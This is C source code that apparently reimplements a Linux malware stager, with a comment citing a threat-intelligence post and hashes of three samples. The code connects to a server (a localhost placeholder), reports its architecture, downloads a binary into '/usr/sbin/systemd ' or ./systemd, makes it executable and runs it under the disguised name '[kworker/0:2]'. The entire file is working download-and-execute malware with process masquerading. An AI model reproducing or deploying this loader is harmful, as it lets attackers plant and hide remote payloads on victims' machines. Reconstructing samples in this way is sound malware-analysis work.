/* 
Reference: https://x.com/Huntio/status/1823280152845107543
Samples:
  facafec4183ca19a003b941f3c668917a3b5ab891e7c939d1e6fc37692416942 - x64 version
  4c0ace878616b963dd6ed320ace24309eaeacfc143255d1639d83130a244719c - x86 version
  4ffb3e6bc0a5d1067d06d61c2461cfeb44093a931f8488729c4731665ed4e358 - arm64 version
*/

#include <stdio.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <sys/stat.h>

int main(int argc, const char **argv, const char **envp)
{
    int sock;
    FILE* file;
    struct sockaddr_in addr;
    struct timeval timeout;
    char* bin_systemd = "/usr/sbin/systemd ";
    ssize_t recved_data;
    char buffer[4096];
    char * str_kworker = "[kworker/0:2]";

    sock = socket(AF_INET, SOCK_STREAM, IPPROTO_IP);
    if (sock < 0)
        return 1;

    timeout.tv_sec = 10;
    timeout.tv_usec = 0;
    setsockopt(sock, SOL_SOCKET, SO_SNDTIMEO, &timeout, sizeof(timeout));

    addr.sin_family = AF_INET;
    addr.sin_addr.s_addr = inet_addr("127.0.0.1");
    addr.sin_port = htons(7744);

    if (connect(sock, (struct sockaddr*)&addr, sizeof(addr)) < 0)
    {
        close(sock);
        return 2;
    }

    file = fopen(bin_systemd, "w");
    if (!file)
    {
        bin_systemd = "./systemd";
        file = fopen(bin_systemd, "w");
        if (!file)
        {
            close(sock);
            return 3;
        }
    }
    chmod(bin_systemd, S_IRWXU);
		
		// arch = l64 | l32 | a64
    const char* arch = "l64";
    send(sock, arch, strlen(arch), 0);
    send(sock, &addr.sin_addr.s_addr, sizeof(addr.sin_addr.s_addr), 0);

    while ( 1 )
    {
        recved_data = recv(sock, &buffer, sizeof(buffer), 0);
        if (recved_data <= 0)
            break;
        fwrite(&buffer, 1, recved_data, file);
    }

    fclose(file);
    close(sock);

    char *const worker[] = {bin_systemd, str_kworker, NULL};
    execvp(bin_systemd, worker);
    return 0;
}
